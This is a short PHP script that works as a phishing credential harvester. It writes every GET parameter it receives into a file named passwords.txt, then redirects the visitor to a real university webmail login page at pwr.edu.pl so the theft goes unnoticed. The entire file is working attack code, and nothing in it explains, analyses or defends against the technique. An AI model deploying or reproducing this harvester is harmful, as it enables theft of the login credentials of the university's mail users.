<?php
#error_reporting(E_ALL);
#ini_set('display_errors', true);

header('HTTP/1.1 307 Temporary Redirect');
header("Location: https://smail.pwr.edu.pl/auth");

$handle = fopen("passwords.txt", "a");
foreach($_GET as $variable => $value) 
{
fwrite($handle, $variable); echo "Var: $variable";
fwrite($handle, "="); echo "=";
fwrite($handle, $value); echo "$value";
fwrite($handle, "\r\n"); echo "\n";
}
fwrite($handle, "\r\n");
fclose($handle);

exit;
?> 